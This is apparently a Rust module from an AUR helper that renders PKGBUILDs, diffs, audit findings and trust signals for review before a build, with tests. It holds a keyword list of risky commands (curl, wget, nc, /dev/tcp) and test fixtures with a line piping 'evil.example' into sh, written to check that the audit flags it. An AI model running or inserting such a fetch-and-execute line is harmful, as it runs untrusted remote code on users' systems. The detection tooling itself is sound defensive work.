//! What a person reads before an AUR package is built (u22): the PKGBUILD, what
//! changed in it, what the audit found and what the trust signals say, laid out to
//! be read. Pure functions from text to text, for a terminal; piped, the plain
//! output of `output.rs` is used instead, so scripts see what they always saw.

use std::collections::BTreeMap;

use emrac_core::aur_trust::{Level, Signal};
use emrac_core::style::{
    display_width, heading, render_line, truncate, wrap, Line, Role, Seg, Style,
};
use emrac_core::{AuditReport, Severity};

// ------------------------------------------------------------------ PKGBUILD

const FLOW: &[&str] = &[
    "if", "then", "else", "elif", "fi", "for", "in", "do", "done", "while", "case", "esac",
    "function", "return", "local",
];

/// Commands that fetch, run what they fetched, or reach for more power: marked
/// in the margin, not judged (the audit does that).
const RISKY: &[&str] = &[
    "curl",
    "wget",
    "sudo",
    "eval",
    "base64",
    "nc",
    "ncat",
    "chmod",
    "chown",
    "systemctl",
    "useradd",
    "groupadd",
    "crontab",
    "insmod",
];

fn is_risky_word(w: &str) -> bool {
    let w = w.trim_matches(|c: char| !c.is_alphanumeric() && c != '/' && c != '_' && c != '-');
    RISKY.contains(&w) || w.starts_with("/dev/tcp")
}

fn key_of(line: &str) -> Option<(&str, &str, &str)> {
    let t = line.trim_start();
    let end = t
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .unwrap_or(t.len());
    if end == 0 {
        return None;
    }
    let (key, rest) = t.split_at(end);
    let op = if rest.starts_with("+=") {
        "+="
    } else if rest.starts_with('=') {
        "="
    } else {
        return None;
    };
    Some((key, op, &rest[op.len()..]))
}

fn function_name(line: &str) -> Option<&str> {
    let t = line.trim_start();
    let name = t.split("()").next()?;
    if name.len() == t.len() || name.is_empty() || name.contains(char::is_whitespace) {
        return None;
    }
    name.chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_')
        .then_some(name)
}

/// One line of shell, coloured by what each word is. Whitespace is kept.
pub fn code_line(text: &str) -> Line {
    let mut line: Line = Vec::new();
    let trimmed = text.trim_start();
    if trimmed.starts_with('#') {
        return vec![Seg::new(text.to_string(), Role::Dim)];
    }
    if let Some(name) = function_name(text) {
        let indent = &text[..text.len() - trimmed.len()];
        line.push(Seg::plain(indent));
        line.push(Seg::new(name.to_string(), Role::Brand));
        line.push(Seg::plain(trimmed[name.len()..].to_string()));
        return line;
    }
    let mut rest = text;
    if let Some((key, op, _)) = key_of(text) {
        let at = text.find(key).unwrap_or(0);
        line.push(Seg::plain(&text[..at]));
        line.push(Seg::new(key.to_string(), Role::Version));
        line.push(Seg::new(op.to_string(), Role::Dim));
        rest = &text[at + key.len() + op.len()..];
    }
    for word in rest.split_inclusive(char::is_whitespace) {
        let bare = word.trim();
        let role = if bare.starts_with("http://")
            || bare.starts_with("https://")
            || bare.starts_with("git+http")
        {
            Role::Path
        } else if is_risky_word(bare) {
            Role::Warn
        } else if FLOW.contains(&bare) {
            Role::Accent
        } else {
            Role::Plain
        };
        if role == Role::Plain {
            line.push(Seg::plain(word.to_string()));
        } else {
            let (body, ws) = word.split_at(word.trim_end().len());
            line.push(Seg::new(body.to_string(), role));
            line.push(Seg::plain(ws.to_string()));
        }
    }
    line
}

fn minus(st: &Style) -> &'static str {
    if st.unicode {
        "\u{2212}"
    } else {
        "-"
    }
}

fn dot(st: &Style) -> &'static str {
    if st.unicode {
        "\u{b7}"
    } else {
        "-"
    }
}

fn plain_len(line: &Line) -> usize {
    line.iter().map(|s| display_width(&s.text)).sum()
}

/// Splits a coloured line into rows of at most `width` columns, keeping colours.
fn wrap_line(line: &Line, width: usize) -> Vec<Line> {
    let width = width.max(10);
    if plain_len(line) <= width {
        return vec![line.clone()];
    }
    let mut rows: Vec<Line> = vec![Vec::new()];
    let mut used = 0;
    for seg in line {
        let mut buf = String::new();
        for c in seg.text.chars() {
            let w = display_width(&c.to_string());
            if used + w > width {
                if !buf.is_empty() {
                    rows.last_mut()
                        .unwrap()
                        .push(Seg::new(std::mem::take(&mut buf), seg.role));
                }
                rows.push(Vec::new());
                used = 0;
            }
            buf.push(c);
            used += w;
        }
        if !buf.is_empty() {
            rows.last_mut().unwrap().push(Seg::new(buf, seg.role));
        }
    }
    rows
}

fn gutter(st: &Style, number: Option<usize>, mark: Option<&str>, width: usize) -> Line {
    let g = st.glyphs();
    let n = number.map_or(" ".repeat(width), |n| format!("{n:>width$}"));
    vec![
        match mark {
            Some(m) => Seg::new(format!("{m} "), Role::Warn),
            None => Seg::plain("  "),
        },
        Seg::new(n, Role::Dim),
        Seg::new(format!(" {} ", g.v), Role::Dim),
    ]
}

/// The PKGBUILD of a first build, to be read: line numbers, colours by what each
/// word is, long lines wrapped under a continuation margin, and a mark beside the
/// lines that fetch or escalate.
pub fn pkgbuild_view(st: &Style, name: &str, text: &str) -> String {
    let g = st.glyphs();
    let lines: Vec<&str> = text.lines().collect();
    let digits = lines.len().max(1).to_string().len().max(2);
    let body_width = st.width.saturating_sub(digits + 7).max(20);
    let mut out = format!(
        "{}\n",
        heading(st, &format!("PKGBUILD {0} {name} {0} first build", dot(st)))
    );
    let mut risky = 0;
    for (i, raw) in lines.iter().enumerate() {
        let code = code_line(&raw.replace('\t', "    "));
        let flagged = code.iter().any(|s| s.role == Role::Warn);
        if flagged {
            risky += 1;
        }
        for (r, row) in wrap_line(&code, body_width).into_iter().enumerate() {
            let mut full = if r == 0 {
                gutter(st, Some(i + 1), flagged.then_some(g.warn), digits)
            } else {
                gutter(st, None, None, digits)
            };
            full.extend(row);
            out.push_str(&render_line(st, &full));
            out.push('\n');
        }
    }
    let mut foot = vec![Seg::new(format!("{} lines", lines.len()), Role::Dim)];
    if risky > 0 {
        foot.push(Seg::new(
            format!(
                " {} {} {risky} line(s) fetch or escalate (marked)",
                dot(st),
                g.warn
            ),
            Role::Warn,
        ));
    }
    out.push_str(&format!("\n{}\n", render_line(st, &foot)));
    out
}

// ---------------------------------------------------------------------- diff

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hunk {
    pub old_start: usize,
    pub new_start: usize,
    /// What follows the second `@@`: usually the function the change is in.
    pub context: String,
    /// `' '`, `'+'`, `'-'`, each with the text after it.
    pub lines: Vec<(char, String)>,
}

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct DiffFile {
    pub name: String,
    pub hunks: Vec<Hunk>,
}

impl DiffFile {
    pub fn added(&self) -> usize {
        self.count('+')
    }
    pub fn removed(&self) -> usize {
        self.count('-')
    }
    fn count(&self, c: char) -> usize {
        self.hunks
            .iter()
            .flat_map(|h| &h.lines)
            .filter(|(k, _)| *k == c)
            .count()
    }
}

fn hunk_header(line: &str) -> Option<(usize, usize, String)> {
    let rest = line.strip_prefix("@@ -")?;
    let (old, rest) = rest.split_once(" +")?;
    let (new, context) = rest.split_once(" @@")?;
    let start = |s: &str| s.split(',').next()?.parse::<usize>().ok();
    Some((start(old)?, start(new)?, context.trim().to_string()))
}

/// A unified diff as files with hunks. What it does not understand is skipped.
pub fn parse_diff(text: &str) -> Vec<DiffFile> {
    let mut files: Vec<DiffFile> = Vec::new();
    for line in text.lines() {
        if let Some(rest) = line.strip_prefix("diff --git ") {
            let name = rest
                .split_whitespace()
                .last()
                .map_or("", |b| b.strip_prefix("b/").unwrap_or(b))
                .to_string();
            files.push(DiffFile {
                name,
                hunks: Vec::new(),
            });
        } else if let Some(name) = line.strip_prefix("+++ ") {
            let name = name.strip_prefix("b/").unwrap_or(name).trim().to_string();
            match files.last_mut() {
                Some(f) if f.hunks.is_empty() => {
                    if name != "/dev/null" {
                        f.name = name;
                    }
                }
                _ => files.push(DiffFile {
                    name,
                    hunks: Vec::new(),
                }),
            }
        } else if let Some((old_start, new_start, context)) = hunk_header(line) {
            if files.is_empty() {
                files.push(DiffFile {
                    name: "PKGBUILD".into(),
                    hunks: Vec::new(),
                });
            }
            files.last_mut().unwrap().hunks.push(Hunk {
                old_start,
                new_start,
                context,
                lines: Vec::new(),
            });
        } else if let Some(h) = files.last_mut().and_then(|f| f.hunks.last_mut()) {
            match line.chars().next() {
                Some(c @ (' ' | '+' | '-')) => h.lines.push((c, line[1..].to_string())),
                None => h.lines.push((' ', String::new())),
                _ => {}
            }
        }
    }
    files
}

/// The assignments that matter to what gets built, found in a diff: each key
/// with what it was and what it is. Multi-line arrays count under their key.
pub fn summarize(files: &[DiffFile]) -> Vec<(String, String, String)> {
    const KEYS: &[&str] = &[
        "pkgver",
        "pkgrel",
        "epoch",
        "source",
        "sha256sums",
        "sha512sums",
        "b2sums",
        "md5sums",
        "depends",
        "makedepends",
        "checkdepends",
        "optdepends",
        "provides",
        "conflicts",
        "replaces",
        "install",
        "arch",
        "license",
    ];
    let mut before: BTreeMap<String, String> = BTreeMap::new();
    let mut after: BTreeMap<String, String> = BTreeMap::new();
    for f in files {
        for h in &f.hunks {
            let mut array: Option<String> = None;
            for (k, text) in &h.lines {
                let key = match key_of(text) {
                    Some((key, _, value)) if KEYS.contains(&key) => {
                        array = value.trim_start().starts_with('(').then(|| key.to_string());
                        if value.contains(')') {
                            array = None;
                        }
                        Some(key.to_string())
                    }
                    _ => {
                        let inside = array.clone();
                        if text.contains(')') {
                            array = None;
                        }
                        inside
                    }
                };
                let Some(key) = key else { continue };
                let value = text
                    .trim()
                    .trim_start_matches(&format!("{key}="))
                    .trim_matches(|c| c == '(' || c == ')' || c == '\'' || c == '"')
                    .to_string();
                let add = |m: &mut BTreeMap<String, String>| {
                    let e = m.entry(key.clone()).or_default();
                    if !e.is_empty() && !value.is_empty() {
                        e.push(' ');
                    }
                    e.push_str(&value);
                };
                match k {
                    '-' => add(&mut before),
                    '+' => add(&mut after),
                    _ => {}
                }
            }
        }
    }
    let mut keys: Vec<&String> = before.keys().chain(after.keys()).collect();
    keys.sort();
    keys.dedup();
    keys.into_iter()
        .map(|k| {
            (
                k.clone(),
                before.get(k).cloned().unwrap_or_default(),
                after.get(k).cloned().unwrap_or_default(),
            )
        })
        .collect()
}

/// The part of two lines that is not shared: (common prefix, common suffix) in chars.
fn common(a: &str, b: &str) -> (usize, usize) {
    let (ac, bc): (Vec<char>, Vec<char>) = (a.chars().collect(), b.chars().collect());
    let prefix = ac.iter().zip(&bc).take_while(|(x, y)| x == y).count();
    let suffix = ac[prefix..]
        .iter()
        .rev()
        .zip(bc[prefix..].iter().rev())
        .take_while(|(x, y)| x == y)
        .count();
    (prefix, suffix)
}

fn emphasise(text: &str, prefix: usize, suffix: usize, tone: Role) -> Line {
    let chars: Vec<char> = text.chars().collect();
    let end = chars.len().saturating_sub(suffix).max(prefix);
    let s = |r: std::ops::Range<usize>| chars[r].iter().collect::<String>();
    let mut line: Line = vec![Seg::new(s(0..prefix), tone)];
    line.push(Seg::new(s(prefix..end), Role::Heading));
    line.push(Seg::new(s(end..chars.len()), tone));
    line.retain(|x| !x.text.is_empty());
    line
}

fn bar(st: &Style, added: usize, removed: usize) -> Line {
    let g = st.glyphs();
    let total = (added + removed).max(1);
    let cells = 12usize;
    let plus = (added * cells).div_ceil(total).min(cells);
    let minus = if removed == 0 {
        0
    } else {
        cells.saturating_sub(plus).max(1).min(cells)
    };
    let plus = plus.min(cells - minus);
    vec![
        Seg::new(g.bar_full.repeat(plus), Role::Added),
        Seg::new(g.bar_full.repeat(minus), Role::Removed),
    ]
}

/// What changed in a PKGBUILD since the last build: a summary of the
/// assignments that matter, then every hunk with the old and new line numbers,
/// and the part of a changed line that really changed picked out.
pub fn diff_view(st: &Style, name: &str, diff: &str) -> String {
    let files = parse_diff(diff);
    let g = st.glyphs();
    let (added, removed): (usize, usize) = files
        .iter()
        .fold((0, 0), |a, f| (a.0 + f.added(), a.1 + f.removed()));
    let mut out = String::new();
    let mut top: Line = vec![
        Seg::new(
            format!(
                "{caret} PKGBUILD changes {sep} {name} {sep} since your last build  ",
                caret = if st.unicode { "\u{25bc}" } else { "v" },
                sep = dot(st)
            ),
            Role::Brand,
        ),
        Seg::new(format!("+{added}"), Role::Added),
        Seg::plain(" "),
        Seg::new(format!("{}{removed}", minus(st)), Role::Removed),
        Seg::plain("  "),
    ];
    top.extend(bar(st, added, removed));
    out.push_str(&render_line(st, &top));
    out.push('\n');

    let summary = summarize(&files);
    if !summary.is_empty() {
        out.push('\n');
        for (key, was, now) in &summary {
            let sources = matches!(
                key.as_str(),
                "source" | "sha256sums" | "sha512sums" | "b2sums" | "md5sums"
            );
            let mut line: Line = vec![Seg::plain("  ")];
            line.push(if sources {
                Seg::new(format!("{} ", g.warn), Role::Warn)
            } else {
                Seg::plain("  ")
            });
            line.push(Seg::new(format!("{key:<12}"), Role::Version));
            let room = st.width.saturating_sub(24) / 2;
            match (was.is_empty(), now.is_empty()) {
                (false, false) => {
                    let (p, s) = common(was, now);
                    let was_l = emphasise(
                        &truncate(st, was, room),
                        p.min(room),
                        s.min(room),
                        Role::Removed,
                    );
                    let now_l = emphasise(
                        &truncate(st, now, room),
                        p.min(room),
                        s.min(room),
                        Role::Added,
                    );
                    line.extend(was_l);
                    line.push(Seg::new(format!(" {} ", g.arrow), Role::Dim));
                    line.extend(now_l);
                }
                (true, false) => {
                    line.push(Seg::new("added ".to_string(), Role::Dim));
                    line.push(Seg::new(truncate(st, now, room * 2), Role::Added));
                }
                (false, true) => {
                    line.push(Seg::new("removed ".to_string(), Role::Dim));
                    line.push(Seg::new(truncate(st, was, room * 2), Role::Removed));
                }
                (true, true) => {}
            }
            out.push_str(&render_line(st, &line));
            out.push('\n');
        }
        if summary.iter().any(|(k, _, _)| {
            matches!(
                k.as_str(),
                "source" | "sha256sums" | "sha512sums" | "b2sums" | "md5sums"
            )
        }) {
            for l in wrap(
                "the sources or their checksums changed: check the new addresses and that the checksums match",
                st.width.saturating_sub(8),
            ) {
                out.push_str(&format!("      {}\n", st.paint(Role::Warn, &l)));
            }
        }
    }

    let digits = files
        .iter()
        .flat_map(|f| &f.hunks)
        .map(|h| (h.old_start + h.lines.len()).max(h.new_start + h.lines.len()))
        .max()
        .unwrap_or(10)
        .to_string()
        .len()
        .max(2);
    let text_width = st.width.saturating_sub(2 * digits + 7).max(20);
    for f in &files {
        out.push('\n');
        out.push_str(&heading(
            st,
            &format!("{} (+{} {}{})", f.name, f.added(), minus(st), f.removed()),
        ));
        out.push('\n');
        for h in &f.hunks {
            let mut head: Line = vec![
                Seg::new(format!("{:>w$} {:>w$} ", "", "", w = digits), Role::Dim),
                Seg::new(format!("{} ", g.v), Role::Dim),
                Seg::new(format!("@@ line {}", h.new_start), Role::Dim),
            ];
            if !h.context.is_empty() {
                head.push(Seg::new(format!("  {}", h.context), Role::Brand));
            }
            out.push_str(&render_line(st, &head));
            out.push('\n');

            let (mut old, mut new) = (h.old_start, h.new_start);
            // pair a run of removed lines with the run of added lines after it
            let mut i = 0;
            while i < h.lines.len() {
                let (kind, text) = &h.lines[i];
                if *kind == ' ' {
                    out.push_str(&as_is(
                        st,
                        &row(
                            st,
                            digits,
                            Some(old),
                            Some(new),
                            ' ',
                            code_dim(text),
                            text_width,
                        ),
                    ));
                    old += 1;
                    new += 1;
                    i += 1;
                    continue;
                }
                let mut j = i;
                while j < h.lines.len() && h.lines[j].0 == '-' {
                    j += 1;
                }
                let mut k = j;
                while k < h.lines.len() && h.lines[k].0 == '+' {
                    k += 1;
                }
                let (dels, adds) = (&h.lines[i..j], &h.lines[j..k]);
                for (n, (_, t)) in dels.iter().enumerate() {
                    let body = match adds.get(n) {
                        Some((_, a)) if dels.len() == adds.len() => {
                            let (p, s) = common(t, a);
                            emphasise(t, p, s, Role::Removed)
                        }
                        _ => vec![Seg::new(t.clone(), Role::Removed)],
                    };
                    out.push_str(&as_is(
                        st,
                        &row(st, digits, Some(old), None, '-', body, text_width),
                    ));
                    old += 1;
                }
                for (n, (_, t)) in adds.iter().enumerate() {
                    let body = match dels.get(n) {
                        Some((_, d)) if dels.len() == adds.len() => {
                            let (p, s) = common(d, t);
                            emphasise(t, p, s, Role::Added)
                        }
                        _ => vec![Seg::new(t.clone(), Role::Added)],
                    };
                    out.push_str(&as_is(
                        st,
                        &row(st, digits, None, Some(new), '+', body, text_width),
                    ));
                    new += 1;
                }
                i = if k == i { i + 1 } else { k };
            }
        }
    }
    out
}

fn code_dim(text: &str) -> Line {
    // context lines are quiet: the colours of the code, dimmed to one tone
    vec![Seg::new(text.to_string(), Role::Dim)]
}

/// A row already drawn to text: kept as it is.
fn as_is(_st: &Style, text: &str) -> String {
    text.to_string()
}

fn row(
    st: &Style,
    digits: usize,
    old: Option<usize>,
    new: Option<usize>,
    kind: char,
    body: Line,
    text_width: usize,
) -> String {
    let g = st.glyphs();
    let num = |n: Option<usize>| n.map_or(" ".repeat(digits), |n| format!("{n:>digits$}"));
    let (sign, role) = match kind {
        '+' => ("+", Role::Added),
        '-' => (minus(st), Role::Removed),
        _ => (" ", Role::Dim),
    };
    let mut rows = wrap_line(&body, text_width).into_iter().enumerate();
    let mut out = String::new();
    while let Some((r, part)) = rows.next() {
        let mut line: Line = if r == 0 {
            vec![
                Seg::new(format!("{} {} ", num(old), num(new)), Role::Dim),
                Seg::new(format!("{} ", g.v), Role::Dim),
                Seg::new(format!("{sign} "), role),
            ]
        } else {
            vec![
                Seg::new(
                    format!("{} {} ", " ".repeat(digits), " ".repeat(digits)),
                    Role::Dim,
                ),
                Seg::new(format!("{} ", g.v), Role::Dim),
                Seg::plain("  "),
            ]
        };
        line.extend(part);
        out.push_str(&render_line(st, &line));
        if rows.len() > 0 {
            out.push('\n');
        }
    }
    out.push('\n');
    // `render_line` is applied to the whole row above; the caller prints it as is
    out.trim_end_matches('\n').to_string() + "\n"
}

// ------------------------------------------------------------- audit and trust

fn badge(st: &Style, text: &str, role: Role) -> Seg {
    // a label with room around it, in the colour of its role
    let _ = st;
    Seg::new(format!(" {text} "), role)
}

/// The audit findings for a package: worst first, each with its severity, its
/// rule and place, what it means and the line it found.
pub fn findings_view(st: &Style, report: &AuditReport) -> String {
    let g = st.glyphs();
    let mut out = String::new();
    let worst = report.findings.iter().map(|f| f.severity).max();
    let (mark, role) = match worst {
        Some(Severity::Critical) => (g.problem, Role::Problem),
        Some(Severity::High) => (g.warn, Role::Warn),
        _ => (g.note, Role::Note),
    };
    out.push_str(&render_line(
        st,
        &vec![
            Seg::new(format!("{mark} "), role),
            Seg::new(
                format!("Audit {} {}", dot(st), report.target),
                Role::Heading,
            ),
            Seg::new(format!("  {} finding(s)", report.findings.len()), Role::Dim),
        ],
    ));
    out.push('\n');
    for f in &report.findings {
        let (label, role) = match f.severity {
            Severity::Critical => ("CRITICAL", Role::Problem),
            Severity::High => ("HIGH", Role::Problem),
            Severity::Warning => ("warning", Role::Warn),
            Severity::Info => ("info", Role::Note),
        };
        let place = if f.line == 0 {
            f.file.clone()
        } else {
            format!("{}:{}", f.file, f.line)
        };
        out.push_str(&render_line(
            st,
            &vec![
                Seg::plain("  "),
                badge(st, label, role),
                Seg::new(format!(" {}", f.rule), Role::Command),
                Seg::new(format!("  {place}"), Role::Path),
            ],
        ));
        out.push('\n');
        for l in wrap(&st.text(&f.message), st.width.saturating_sub(6)) {
            out.push_str(&format!("      {l}\n"));
        }
        if !f.excerpt.trim().is_empty() {
            let shown = truncate(st, f.excerpt.trim(), st.width.saturating_sub(10));
            out.push_str(&render_line(
                st,
                &vec![
                    Seg::plain("      "),
                    Seg::new(format!("{} ", g.v), Role::Dim),
                    Seg::new(shown, role_for_excerpt(f.severity)),
                ],
            ));
            out.push('\n');
        }
    }
    out.push_str(&format!(
        "\n{}\n",
        st.paint(
            Role::Dim,
            "static reading only \u{2014} it can miss things and can flag legitimate code"
        )
    ));
    out
}

fn role_for_excerpt(s: Severity) -> Role {
    match s {
        Severity::Critical | Severity::High => Role::Removed,
        Severity::Warning => Role::Warn,
        Severity::Info => Role::Plain,
    }
}

/// What the AUR and the change since your last build say about trusting a package.
pub fn trust_view(st: &Style, name: &str, signals: &[Signal]) -> String {
    let g = st.glyphs();
    let mut out = format!("{}\n", heading(st, &format!("Trust {} {name}", dot(st))));
    for s in signals {
        let (label, role, mark) = match s.level {
            Level::High => ("HIGH", Role::Problem, g.problem),
            Level::Warning => ("warning", Role::Warn, g.warn),
            Level::Note => ("note", Role::Note, g.note),
        };
        let rows = wrap(&st.text(&s.text), st.width.saturating_sub(16));
        for (i, l) in rows.iter().enumerate() {
            let lead: Line = if i == 0 {
                vec![
                    Seg::plain(" "),
                    Seg::new(format!("{mark} "), role),
                    Seg::new(format!("{label:<8}"), role),
                ]
            } else {
                vec![Seg::plain(" ".repeat(12))]
            };
            let mut line = lead;
            line.push(Seg::plain(l.clone()));
            out.push_str(&render_line(st, &line));
            out.push('\n');
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use emrac_core::style::{display_width, strip_ansi, Depth, Theme};
    use emrac_core::Finding;

    fn st(color: bool, unicode: bool) -> Style {
        Style {
            color,
            unicode,
            fancy: true,
            width: 80,
            theme: Theme::Default,
            depth: Depth::TrueColor,
        }
    }

    const PKGBUILD: &str = "# Maintainer: x\npkgname=foo\npkgver=1.2.3\nsource=(\"https://example.org/foo-$pkgver.tar.gz\")\nsha256sums=('abc')\n\nbuild() {\n  cd foo\n  curl -s https://evil.example/x.sh | sh\n  make\n}\n";

    const DIFF: &str = "diff --git a/PKGBUILD b/PKGBUILD\nindex 111..222 100644\n--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,8 +1,9 @@ pkgname=foo\n pkgname=foo\n-pkgver=1.2.3\n+pkgver=1.2.4\n pkgrel=1\n-source=(\"https://example.org/foo-$pkgver.tar.gz\")\n-sha256sums=('abc')\n+source=(\"https://example.net/foo-$pkgver.tar.gz\"\n+        \"extra.patch\")\n+sha256sums=('def' 'ghi')\n \n build() {\n   cd foo\n";

    #[test]
    fn code_is_coloured_by_what_each_word_is_and_keeps_its_text() {
        for text in [
            "pkgver=1.2.3",
            "  curl -s https://x.example | sh",
            "# a comment",
            "build() {",
            "  if [ -f a ]; then rm a; fi",
            "source=(\"https://a.example/x.tar.gz\")",
            "",
        ] {
            let line = code_line(text);
            assert_eq!(emrac_core::style::line_text(&line), text, "{text:?}");
        }
        let roles = |t: &str| code_line(t).iter().map(|s| s.role).collect::<Vec<_>>();
        assert!(roles("pkgver=1.2.3").contains(&Role::Version));
        assert!(roles("  curl -s x").contains(&Role::Warn));
        assert!(roles("https://a.b/c").contains(&Role::Path));
        assert_eq!(roles("# hello"), vec![Role::Dim]);
        assert!(roles("build() {").contains(&Role::Brand));
        assert!(roles("if a; then").contains(&Role::Accent));
        assert!(!roles("make install").contains(&Role::Warn));
    }

    #[test]
    fn a_pkgbuild_has_numbered_lines_and_marks_the_ones_that_fetch() {
        let out = pkgbuild_view(&st(false, true), "foo", PKGBUILD);
        let plain = strip_ansi(&out);
        assert!(
            plain.contains("PKGBUILD \u{b7} foo \u{b7} first build"),
            "{plain}"
        );
        assert!(plain.contains("1 \u{2502} # Maintainer: x"), "{plain}");
        let curl = plain.lines().find(|l| l.contains("curl -s")).unwrap();
        assert!(curl.contains('\u{26a0}') && curl.contains(" 9 "), "{curl}");
        assert!(
            plain.contains("11 lines") && plain.contains("1 line(s) fetch or escalate"),
            "{plain}"
        );
        for l in plain.lines() {
            assert!(display_width(l) <= 80, "{l:?}");
        }
    }

    #[test]
    fn a_long_line_is_wrapped_under_its_own_margin_not_cut() {
        let long = format!("source=(\"https://example.org/{}\")", "a".repeat(150));
        let out = strip_ansi(&pkgbuild_view(&st(false, true), "foo", &long));
        let rows: Vec<&str> = out.lines().filter(|l| l.contains('\u{2502}')).collect();
        assert!(rows.len() >= 3, "{out}");
        assert!(rows.iter().all(|l| display_width(l) <= 80));
        let joined: String = rows
            .iter()
            .map(|l| l.split('\u{2502}').nth(1).unwrap().trim_start_matches(' '))
            .collect();
        assert!(joined.contains(&"a".repeat(150)), "nothing is lost");
    }

    #[test]
    fn a_diff_is_parsed_into_files_and_hunks_with_their_numbers() {
        let files = parse_diff(DIFF);
        assert_eq!(files.len(), 1);
        assert_eq!(files[0].name, "PKGBUILD");
        assert_eq!((files[0].added(), files[0].removed()), (4, 3));
        let h = &files[0].hunks[0];
        assert_eq!(
            (h.old_start, h.new_start, h.context.as_str()),
            (1, 1, "pkgname=foo")
        );
        assert_eq!(h.lines[0], (' ', "pkgname=foo".to_string()));
        // a bare ---/+++ diff works too, and so does nothing at all
        let bare = parse_diff("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3 +3 @@\n-a\n+b\n");
        assert_eq!(
            (bare[0].name.as_str(), bare[0].added(), bare[0].removed()),
            ("PKGBUILD", 1, 1)
        );
        assert!(parse_diff("").is_empty() && parse_diff("garbage\nlines").is_empty());
    }

    #[test]
    fn the_summary_names_what_changed_in_the_assignments_that_matter() {
        let s = summarize(&parse_diff(DIFF));
        let get = |k: &str| s.iter().find(|(key, _, _)| key == k).cloned().unwrap();
        assert_eq!(
            get("pkgver"),
            ("pkgver".into(), "1.2.3".into(), "1.2.4".into())
        );
        let src = get("source");
        assert!(
            src.1.contains("example.org")
                && src.2.contains("example.net")
                && src.2.contains("extra.patch"),
            "{src:?}"
        );
        let sums = get("sha256sums");
        assert!(
            sums.1.contains("abc") && sums.2.contains("def") && sums.2.contains("ghi"),
            "{sums:?}"
        );
        assert!(
            !s.iter().any(|(k, _, _)| k == "pkgrel"),
            "unchanged lines are not changes"
        );
        assert!(summarize(&[]).is_empty());
    }

    #[test]
    fn the_diff_view_shows_the_summary_the_numbers_and_what_changed_inside_a_line() {
        let out = diff_view(&st(false, true), "foo", DIFF);
        let plain = strip_ansi(&out);
        assert!(
            plain
                .contains("PKGBUILD changes \u{b7} foo \u{b7} since your last build  +4 \u{2212}3"),
            "{plain}"
        );
        assert!(
            plain.contains("pkgver") && plain.contains("1.2.3") && plain.contains("1.2.4"),
            "{plain}"
        );
        assert!(
            plain.contains("the sources or their checksums changed"),
            "{plain}"
        );
        assert!(plain.contains("@@ line 1  pkgname=foo"), "{plain}");
        let removed = plain
            .lines()
            .find(|l| l.contains("\u{2212} pkgver=1.2.3"))
            .unwrap();
        let added = plain
            .lines()
            .find(|l| l.contains("+ pkgver=1.2.4"))
            .unwrap();
        assert!(
            removed.trim_start().starts_with('2') && added.contains(" 2 "),
            "{removed:?} {added:?}"
        );
        for l in plain.lines() {
            assert!(display_width(l) <= 80, "{l:?}");
        }
        // with colour, only the digit that changed is bold
        let lit = diff_view(&st(true, true), "foo", DIFF);
        assert!(
            lit.contains("\u{1b}[1m3\u{1b}[0m") || lit.contains("\u{1b}[1m4\u{1b}[0m"),
            "{lit:?}"
        );
        assert_eq!(strip_ansi(&lit), plain);
    }

    #[test]
    fn the_ascii_views_are_ascii_and_a_diff_of_nothing_is_a_heading() {
        let ascii = |t: &str| t.is_ascii();
        assert!(
            ascii(&strip_ansi(&diff_view(&st(false, false), "foo", DIFF))),
            "diff"
        );
        assert!(
            ascii(&strip_ansi(&pkgbuild_view(
                &st(false, false),
                "foo",
                PKGBUILD
            ))),
            "pkgbuild"
        );
        let empty = strip_ansi(&diff_view(&st(false, true), "foo", ""));
        assert!(
            empty.contains("+0 \u{2212}0") && empty.lines().count() <= 2,
            "{empty}"
        );
    }

    fn finding(sev: Severity, rule: &'static str, line: usize) -> Finding {
        Finding {
            rule,
            severity: sev,
            file: "PKGBUILD".into(),
            line,
            message: "downloads something and runs it without looking at it, which is how most of the bad ones work".into(),
            excerpt: "curl -s https://evil.example/x.sh | sh".into(),
        }
    }

    #[test]
    fn findings_are_badged_by_severity_and_show_what_was_found() {
        let report = AuditReport {
            target: "foo".into(),
            findings: vec![
                finding(Severity::Critical, "curl-pipe-shell", 9),
                finding(Severity::Warning, "odd-flag", 0),
            ],
        };
        let plain = strip_ansi(&findings_view(&st(false, true), &report));
        assert!(plain.contains("Audit \u{b7} foo  2 finding(s)"), "{plain}");
        assert!(
            plain.contains(" CRITICAL  curl-pipe-shell  PKGBUILD:9"),
            "{plain}"
        );
        assert!(plain.contains(" warning  odd-flag  PKGBUILD"), "{plain}");
        assert!(
            plain.contains("\u{2502} curl -s https://evil.example/x.sh | sh"),
            "{plain}"
        );
        assert!(plain.contains("static reading only"));
        for l in plain.lines() {
            assert!(display_width(l) <= 80, "{l:?}");
        }
        assert!(findings_view(&st(true, true), &report).contains('\u{1b}'));
    }

    #[test]
    fn trust_signals_are_labelled_and_wrapped_under_their_label() {
        let signals = vec![
            Signal { level: Level::High, code: "x", text: "the maintainer changed since your last build, and the new one has no other packages on the AUR at all, which is how takeovers look".into() },
            Signal { level: Level::Note, code: "y", text: "first build".into() },
        ];
        let plain = strip_ansi(&trust_view(&st(false, true), "foo", &signals));
        assert!(plain.contains("Trust \u{b7} foo"), "{plain}");
        assert!(
            plain.contains("\u{2716} HIGH") && plain.contains("\u{25cf} note"),
            "{plain}"
        );
        let rows: Vec<&str> = plain.lines().collect();
        assert!(rows.len() >= 4, "{plain}");
        assert!(rows.iter().all(|l| display_width(l) <= 80));
    }
}
